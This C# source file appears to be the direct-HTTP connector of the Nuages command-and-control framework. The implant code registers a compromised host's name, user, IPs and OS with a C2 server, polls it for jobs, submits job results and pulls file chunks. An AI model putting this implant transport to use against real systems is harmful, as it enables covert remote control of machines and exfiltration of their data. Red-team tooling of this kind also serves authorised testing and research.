using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using Newtonsoft.Json.Linq;

namespace NuagesC2Direct
{
    public interface NuagesC2Connector
    {
        string getConnectionString();

        string getHandler();

        string RegisterImplant(string hostname = "", string username = "", string localIp = "", string sourceIp = "", string os = "", string handler = "", string connectionString = "", Dictionary<string, string> options = null, String[] supportedPayloads = null);

        void SubmitJobResult(string jobId, string result = "", bool moreData = false, bool error = false, int n = 0, string data = "");

        JArray Heartbeat(string implantId);

        string GetFileChunk(string fileId, int n);

    }

    public class NuagesC2Direct: NuagesC2Connector
    {
        private string connectionString;

        private string handler = "Direct";

        public NuagesC2Direct(string connectionString)
        {
            this.connectionString = connectionString;
        }

        public string getConnectionString() {
            return this.connectionString;
        }

        public string getHandler()
        {
            return this.handler;
        }

        string POST(string url, string jsonContent)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
            request.Method = "POST";

            System.Text.UTF8Encoding encoding = new System.Text.UTF8Encoding();
            Byte[] byteArray = encoding.GetBytes(jsonContent);

            request.ContentLength = byteArray.Length;
            request.ContentType = @"application/json";

            using (Stream dataStream = request.GetRequestStream())
            {
                dataStream.Write(byteArray, 0, byteArray.Length);
            }
            
            using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
            {
                using (Stream responseStream = response.GetResponseStream())
                {
                    StreamReader reader = new StreamReader(responseStream, System.Text.Encoding.GetEncoding("utf-8"));
                    return reader.ReadToEnd();
                }
            }
        }
        public void SubmitJobResult(string jobId, string result = "", bool moreData = false, bool error = false, int n = 0, string data = "")
        {
            JObject body = new JObject(
                new JProperty("n", n),
                new JProperty("moreData", moreData),
                new JProperty("error", error),
                new JProperty("result", result),
                new JProperty("jobId", jobId),
                new JProperty("data", data)
            );
            this.POST(this.connectionString + "/implant/jobresult", body.ToString());
        }

        public string RegisterImplant(string hostname = "", string username = "",  string localIp = "", string sourceIp = "", string os = "", string handler = "", string connectionString = "", Dictionary<string, string> options = null, String[] supportedPayloads = null)
        {
            JObject body = new JObject(
                new JProperty("hostname", hostname),
                new JProperty("username", username),
                new JProperty("localIp", localIp),
                new JProperty("sourceIp", sourceIp),
                new JProperty("os", os),
                new JProperty("handler", handler),
                new JProperty("connectionString", connectionString),
                new JProperty("options", JObject.FromObject(options)),
                new JProperty("supportedPayloads", JArray.FromObject(supportedPayloads))
            );
            JObject response = JObject.Parse(this.POST(this.connectionString + "/implant/register", body.ToString()));
            return response["_id"].ToString();
        }

        public JArray Heartbeat(string implantId) {
            JObject body = new JObject(
                new JProperty("id", implantId)
            );
            JObject response = JObject.Parse(this.POST(this.connectionString + "/implant/heartbeat", body.ToString()));
            return (JArray)response["data"];
        }

        public string GetFileChunk(string fileId, int n) {
            JObject body = new JObject(
                new JProperty("n", n),
                new JProperty("file_id", fileId)
            );

            JObject response = JObject.Parse(this.POST(this.connectionString + "/implant/chunks", body.ToString()));
            try
            {
                return response["data"].ToString();
            }
            catch {
                return "";
            }
        }
    }

}
